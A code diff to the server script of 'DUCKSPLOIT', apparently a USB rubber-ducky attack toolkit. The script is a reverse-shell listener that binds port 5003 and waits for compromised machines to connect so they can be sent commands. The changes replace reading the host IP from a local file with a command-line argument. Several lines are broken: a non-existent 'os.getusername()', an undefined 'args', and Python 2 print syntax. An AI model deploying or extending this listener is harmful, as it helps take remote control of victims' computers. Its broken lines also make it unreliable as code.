@@ -1,15 +1,10 @@
 import socket
-os
-
-username2 = os.getusername()
-
-
-with open(f'C:\Users\{username2}\DUCKSPLOIT\myip.txt') as f:
-    SERVER_HOST = f.readlines()
-
-print SERVER_HOST
+import os
+import sys
 
 
+
+SERVER_HOST = args[0]
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
@@ -21,7 +16,7 @@ s = socket.socket()
 # bind the socket to all IP addresses of this host
 s.bind((SERVER_HOST, SERVER_PORT))
 # make the PORT reusable
-# when you run the server multiple times in Linux, Address already in use error will raise
+# when you run the server.py multiple times in Linux, Address already in use error will raise
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
@@ -57,5 +52,5 @@ while True:
     continue
 # close connection to the client
 client_socket.close()
-# close server connection
+# close server.py connection
 s.close()
